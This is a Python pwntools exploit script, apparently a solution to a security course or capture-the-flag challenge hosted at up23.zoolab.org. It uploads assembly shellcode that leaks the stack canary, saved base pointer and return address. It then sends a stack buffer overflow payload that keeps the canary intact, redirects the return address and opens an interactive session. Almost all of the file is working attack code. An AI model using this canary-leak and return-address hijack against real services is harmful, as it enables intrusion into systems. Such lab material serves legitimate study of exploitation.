#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

if sys.argv[1] == 'asm':
    instructions = '''
        endbr64
        push   rbp
        mov    rbp,rsp
        sub    rsp,0x40
        mov    QWORD PTR [rbp-0x38],rdi
        mov    rax,QWORD PTR fs:0x28
        mov    QWORD PTR [rbp-0x8],rax
        xor    eax,eax
        mov	   rdi,1
        lea	   rsi,[rbp-0x8]
        mov	   rdx,0x18
        mov	   rax,1
        syscall
    '''

    payload = asm(instructions, arch='amd64', os='linux')
    r = remote("up23.zoolab.org", 10816)

    if type(r) != pwnlib.tubes.process.process:
        pw.solve_pow(r)

    print("** {} bytes to submit, solver found at {:x}".format(len(payload), 0))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(0).encode())
    r.sendafter(b'bytes): ', payload)

    r.recv()

    num = p64(0x0000000000003934)
    num += b'0' * 16

    solver_output = r.recv()
    canary = solver_output[0:8]
    rbp = solver_output[8:16]
    return_addr = p64(u64(solver_output[16:24]) + 0xab)
    temp = b'00000000'
    num += canary + rbp + return_addr + temp

    num += p64(0x0000003100000000)
    # 0x0000000000003934  --p64()--> b'0000000000000049' --strtol()--> 49 = 0x31
    # 0x0000003100000000  --p64()--> b'0000000100000000' -> 0x31 in memory (magic is in first 8 bit)

    r.sendlineafter(b'Show me your answer? ', num)
else:
    exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

    payload = None
    if os.path.exists(exe):
        with open(exe, 'rb') as f:
            payload = f.read()

    # r = process("./remoteguess", shell=True)
    #r = remote("localhost", 10816)
    r = remote("up23.zoolab.org", 10816)

    if type(r) != pwnlib.tubes.process.process:
        pw.solve_pow(r)

    if payload != None:
        ef = ELF(exe)
        print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
        r.sendlineafter(b'send to me? ', str(len(payload)).encode())
        r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
        r.sendafter(b'bytes): ', payload)
    else:
        r.sendlineafter(b'send to me? ', b'0')

    r.recv()
    
    num = p64(0x3934)
    num += b'0' * 16

    for i in range(4):
        bs = r.recvuntil(b'\n')
        s = bs[:-1].decode('ascii')
        h = int(s, 16)
        if i == 2: h += 0xab
        num += p64(h)

    num += p64(0x0000003100000000)
    # 0x0000000000003934  --p64()--> b'0000000000000049' --strtol()--> 49 = 0x31
    # 0x0000003100000000  --p64()--> b'0000000100000000' -> 0x31 in memory (magic in first 8 bit)

    r.sendlineafter(b'Show me your answer? ', num)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
